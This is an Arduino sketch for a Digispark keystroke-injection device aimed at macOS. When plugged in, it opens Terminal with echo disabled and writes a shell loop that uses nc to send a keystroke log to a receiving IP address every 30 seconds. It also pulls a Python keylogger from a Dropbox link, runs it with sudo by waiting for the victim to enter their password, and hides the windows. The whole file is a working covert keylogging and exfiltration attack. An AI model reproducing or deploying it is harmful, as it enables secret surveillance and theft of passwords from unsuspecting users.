#include "DigiKeyboard.h"

void setup() {
  // put your setup code here, to run once:

}

bool finished = false;

void loop() {
  if (not finished) {
    DigiKeyboard.sendKeyStroke(0);

    // open terminal
    DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("terminal");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);
    
    // For testing purposes - needed if you want to try to send files to yourself
    //  You'll have a terminal window open for listening, so open another terminal window to
    //   run the rest of this script
    //  Shortcut to open a new terminal window: Command + N
    /* DigiKeyboard.sendKeyStroke(KEY_N, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);*/
    
    // disable terminal echoing
    DigiKeyboard.print("stty -echo");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(250);

    // go to the Documents folder
    DigiKeyboard.print("cd ~/Documents");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(250);

    // write a shell script to repeatedly send the logged_text.txt file back to us
    /*
     * Code:
          #! /bin/sh
          
          while :
          do
              nc [receiving computer's IP address] 1234 < logged_text.txt
              sleep 30
          done
     */
     
    // writing the above code into the keylog.sh file 
    DigiKeyboard.print("echo ");
    DigiKeyboard.sendKeyStroke(52, MOD_SHIFT_LEFT);
    DigiKeyboard.print("#! /bin/sh");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.print("while :");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.print("do");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    // ** replace the IP address below with your computer's IP address **
    DigiKeyboard.print("  nc [receiving computer's IP address] 1234 < ~/Documents/logged_text.txt");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.print("done");
    DigiKeyboard.sendKeyStroke(52, MOD_SHIFT_LEFT);
    DigiKeyboard.print("> keylog.sh");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(250);

    // change file permissions so that we can execute it
    DigiKeyboard.print("chmod +x keylog.sh");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(250);

    // function to get the python keylogger
    write_logger();

    // create the file which will be recording the keystrokes
    DigiKeyboard.print("vim logged_text.txt");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.print(":wq");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);

    // run the shell script
    DigiKeyboard.print("./keylog.sh");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);

    // open a new terminal window and run the keylogger
    DigiKeyboard.sendKeyStroke(KEY_N, MOD_GUI_LEFT);
    DigiKeyboard.print("cd Documents");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    
    // unfortunately, we need to use sudo, so we need the password
    DigiKeyboard.print("sudo python3 ~/Documents/logger.py");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    
    // allow 5 seconds for the user to type their password in
    DigiKeyboard.delay(5000);

    // hide all terminal windows
    DigiKeyboard.sendKeyStroke(KEY_H, MOD_GUI_LEFT);
    
    finished = true;
  }
}

// function to write the python keylogger
void write_logger() {

    // code is available from Dropbox
    // open the Dropbox link in Chrome
    DigiKeyboard.print("open -a ");
    DigiKeyboard.sendKeyStroke(52, MOD_SHIFT_LEFT);
    DigiKeyboard.print("Google Chrome");
    DigiKeyboard.sendKeyStroke(52, MOD_SHIFT_LEFT);
    DigiKeyboard.print(" --args --new-window https://www.dl.dropboxusercontent.com/s/u34rsg5bguh95uq/logger.py?dl=0");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(3500);

    // copy the code in the Dropbox file
    DigiKeyboard.sendKeyStroke(KEY_A, MOD_GUI_LEFT);
    DigiKeyboard.delay(250);
    DigiKeyboard.sendKeyStroke(KEY_C, MOD_GUI_LEFT);
    DigiKeyboard.delay(250);
    
    // close the Chrome window
    DigiKeyboard.sendKeyStroke(KEY_W, MOD_GUI_LEFT);

    // navigate back to the terminal
    DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
    DigiKeyboard.delay(250);
    DigiKeyboard.print("terminal");
    DigiKeyboard.delay(250);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);

    // paste the contents of the Dropbox file into 'logger.py'
    DigiKeyboard.print("vim logger.py");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_V, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.print(":wq");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
}
